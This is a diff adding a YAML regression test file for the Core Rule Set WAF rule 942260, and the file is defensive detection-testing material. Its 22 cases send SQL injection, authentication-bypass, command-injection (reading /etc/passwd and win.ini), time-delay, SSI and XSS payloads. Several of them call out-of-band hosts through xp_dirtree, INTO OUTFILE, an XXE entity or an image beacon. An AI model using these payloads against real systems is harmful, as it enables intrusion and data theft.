@@ -1,0 +1,337 @@
+---
+meta:
+  author: "Christian S.J. Peron, Christian Folini"
+  description: None
+  enabled: true
+  name: 942260.yaml
+tests:
+  - test_title: 942260-1
+    desc: "Basic SQL authentication bypass"
+    stages:
+      - stage:
+          input:
+            dest_addr: 127.0.0.1
+            headers:
+              Host: localhost
+            method: GET
+            port: 80
+            # something LIKE '
+            uri: "/?var=something%20LIKE%20%27"
+            version: HTTP/1.0
+          output:
+            log_contains: id "942260"
+  - test_title: 942260-2
+    desc: "Basic SQL authentication bypass"
+    stages:
+      - stage:
+          input:
+            dest_addr: 127.0.0.1
+            headers:
+              Host: localhost
+            method: POST
+            port: 80
+            uri: "/"
+            data: "var=0.3480567293179807' UNION ALL select NULL --"
+            version: HTTP/1.0
+          output:
+            log_contains: id "942260"
+  - test_title: 942260-3
+    desc: "Basic SQL authentication bypass"
+    stages:
+      - stage:
+          input:
+            dest_addr: 127.0.0.1
+            headers:
+              Host: localhost
+            method: POST
+            port: 80
+            uri: "/"
+            data: "var=config.ini\") UNION ALL select NULL --"
+            version: HTTP/1.0
+          output:
+            log_contains: id "942260"
+  - test_title: 942260-4
+    desc: "Basic SQL authentication bypass"
+    stages:
+      - stage:
+          input:
+            dest_addr: 127.0.0.1
+            headers:
+              Host: localhost
+            method: POST
+            port: 80
+            uri: "/"
+            data: "var=CRS) UNION ALL select NULL --"
+            version: HTTP/1.0
+          output:
+            log_contains: id "942260"
+  - test_title: 942260-5
+    desc: "Basic SQL authentication bypass"
+    stages:
+      - stage:
+          input:
+            dest_addr: 127.0.0.1
+            headers:
+              Host: localhost
+            method: POST
+            port: 80
+            uri: "/"
+            data: "var=CRS3\") UNION ALL select NULL --"
+            version: HTTP/1.0
+          output:
+            log_contains: id "942260"
+  - test_title: 942260-6
+    desc: "Advanced SQL authentication bypass"
+    stages:
+      - stage:
+          input:
+            dest_addr: 127.0.0.1
+            headers:
+              Host: localhost
+            method: POST
+            port: 80
+            uri: "/"
+            data: "var=abcd'||(select extractvalue(xmltype('<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE root [ <!ENTITY % ptkjp SYSTEM \"http://ujh7ulc82qzu8b95mtuz6776txzunittests.core'||'ruleset.org/\">%ptkjp;"
+            version: HTTP/1.0
+          output:
+            log_contains: id "942260"
+  - test_title: 942260-7
+    desc: "Embedded shell execution"
+    stages:
+      - stage:
+          input:
+            dest_addr: 127.0.0.1
+            headers:
+              Host: localhost
+            method: POST
+            port: 80
+            uri: "/"
+            data: "var=` /bin/cat /etc/passwd`"
+            version: HTTP/1.0
+          output:
+            log_contains: id "942260"
+  - test_title: 942260-8
+    desc: "Embedded shell execution"
+    stages:
+      - stage:
+          input:
+            dest_addr: 127.0.0.1
+            headers:
+              Host: localhost
+            method: POST
+            port: 80
+            uri: "/"
+            data: "var=0.84622338492032948`echo${IFS}crs312``echo${IFS}34test`"
+            version: HTTP/1.0
+          output:
+            log_contains: id "942260"
+  - test_title: 942260-9
+    desc: "Embedded shell execution"
+    stages:
+      - stage:
+          input:
+            dest_addr: 127.0.0.1
+            headers:
+              Host: localhost
+            method: POST
+            port: 80
+            uri: "/"
+            data: "var=`echo crs312``echo 34test`"
+            version: HTTP/1.0
+          output:
+            log_contains: id "942260"
+  - test_title: 942260-10
+    desc: "Embedded shell execution"
+    stages:
+      - stage:
+          input:
+            dest_addr: 127.0.0.1
+            headers:
+              Host: localhost
+            method: POST
+            port: 80
+            uri: "/"
+            data: "var=123-456-01@coreruleset.org'|ping -c 1337 127.0.0.1 #"
+            version: HTTP/1.0
+          output:
+            log_contains: id "942260"
+  - test_title: 942260-11
+    desc: "Advanced embedded shell execution"
+    stages:
+      - stage:
+          input:
+            dest_addr: 127.0.0.1
+            headers:
+              Host: localhost
+            method: POST
+            port: 80
+            uri: "/"
+            data: "var=1);declare @q varchar(99);set @q='\\\\j0kwbatxjfgjp0qu3ibonwovamgmkq8h05unittests.corerule' 'set.org\\kph'; exec master.dbo.xp_dirtree @q;--"
+            version: HTTP/1.0
+          output:
+            log_contains: id "942260"
+  - test_title: 942260-12
+    desc: "Advanced embedded shell execution"
+    stages:
+      - stage:
+          input:
+            dest_addr: 127.0.0.1
+            headers:
+              Host: localhost
+            method: POST
+            port: 80
+            uri: "/"
+            data: "var=content.ini);declare @q varchar(99);set @q='\\\\i1kvc9uwkehiqzrt4hcnovpublhunittests.corerule' 'set.org\\lri'; exec master.dbo.xp_dirtree @q;--"
+            version: HTTP/1.0
+          output:
+            log_contains: id "942260"
+  - test_title: 942260-13
+    desc: "Advanced embedded shell execution"
+    stages:
+      - stage:
+          input:
+            dest_addr: 127.0.0.1
+            headers:
+              Host: localhost
+            method: POST
+            port: 80
+            uri: "/"
+            data: "var=EmptyValue', '4', '2', '7');declare @q varchar(99);set @q='\\\\h5nug8yvodlhuyvs8ggmsuttfklkcjunittests.corerule'+'set.org\\vcr'; exec master.dbo.xp_dirtree @q;--"
+            version: HTTP/1.0
+          output:
+            log_contains: id "942260"
+  - test_title: 942260-14
+    desc: "Advanced embedded shell execution"
+    stages:
+      - stage:
+          input:
+            dest_addr: 127.0.0.1
+            headers:
+              Host: localhost
+            method: POST
+            port: 80
+            uri: "/"
+            data: "var=test));declare @q varchar(99);set @q='\\\\zwzc7qpdfvczlgmazy74jckb62cunittests.corrule'+'set.org\\gej'; exec master.dbo.xp_dirtree @q;--"
+            version: HTTP/1.0
+          output:
+            log_contains: id "942260"
+  - test_title: 942260-15
+    desc: "Advanced embedded shell execution"
+    stages:
+      - stage:
+          input:
+            dest_addr: 127.0.0.1
+            headers:
+              Host: localhost
+            method: POST
+            port: 80
+            uri: "/"
+            data: "var=/config.ini' into outfile '\\\\\\\\il7vw9ew4e1iazbtohwn8v9uvl1hunitetests.coreruleset.org\\\\yxq'; --"
+            version: HTTP/1.0
+          output:
+            log_contains: id "942260"
+  - test_title: 942260-16
+    desc: "Advanced embedded shell execution"
+    stages:
+      - stage:
+          input:
+            dest_addr: 127.0.0.1
+            headers:
+              Host: localhost
+            method: POST
+            port: 80
+            uri: "/"
+            data: "var=EmptyValue into outfile '\\\\\\\\jviw6aoxefbjk0luyi6oiwjv5unittests.coreruleset.org\\\\xct'; --"
+            version: HTTP/1.0
+          output:
+            log_contains: id "942260"
+  - test_title: 942260-17
+    desc: "Advanced embedded shell execution"
+    stages:
+      - stage:
+          input:
+            dest_addr: 127.0.0.1
+            headers:
+              Host: localhost
+            method: POST
+            port: 80
+            uri: "/"
+            data: "var=test@coreruleset.org\"|type %SYSTEMROOT%\\win.ini"
+            version: HTTP/1.0
+          output:
+            log_contains: id "942260"
+  - test_title: 942260-18
+    desc: "Traces of XSS"
+    stages:
+      - stage:
+          input:
+            dest_addr: 127.0.0.1
+            headers:
+              Host: localhost
+            method: POST
+            port: 80
+            uri: "/"
+            data: "var=mytest>'>\"></mytest><mytest>"
+            version: HTTP/1.0
+          output:
+            log_contains: id "942260"
+  - test_title: 942260-19
+    desc: "Advanced SQL authentication bypass"
+    stages:
+      - stage:
+          input:
+            dest_addr: 127.0.0.1
+            headers:
+              Host: localhost
+            method: POST
+            port: 80
+            uri: "/"
+            data: "var=\"123-456-123@coreruleset.org\"' and (select*from(select(sleep(10)))a)--"
+            version: HTTP/1.0
+          output:
+            log_contains: id "942260"
+  - test_title: 942260-20
+    desc: "Advanced embedded shell execution"
+    stages:
+      - stage:
+          input:
+            dest_addr: 127.0.0.1
+            headers:
+              Host: localhost
+            method: POST
+            port: 80
+            uri: "/"
+            data: "var=\"tester@coreruleset.org\"' waitfor delay'0:0:20'--"
+            version: HTTP/1.0
+          output:
+            log_contains: id "942260"
+  - test_title: 942260-21
+    desc: "Advanced embedded shell execution"
+    stages:
+      - stage:
+          input:
+            dest_addr: 127.0.0.1
+            headers:
+              Host: localhost
+            method: POST
+            port: 80
+            uri: "/"
+            data: "var=\"-->'-->`--><!--#set var=\"qjr9\" value=\"kjkjg7sdk\"--><!--#set var=\"fqz7\" value=\"sql4xxaq\"--><!--#echo var=\"qjr9\"--><!--#echo var=\"fq4p\"-->"
+            version: HTTP/1.0
+          output:
+            log_contains: id "942260"
+  - test_title: 942260-22
+    desc: "Traces of XSS"
+    stages:
+      - stage:
+          input:
+            dest_addr: 127.0.0.1
+            headers:
+              Host: localhost
+            method: POST
+            port: 80
+            uri: "/"
+            data: "var='\"><svg/onload=(new(Image)).src='//m8vzjd10riomx3yxblmcnvaskjghsdz8xorciu7\\56coreruleset.org'>"
+            version: HTTP/1.0
+          output:
+            log_contains: id "942260"
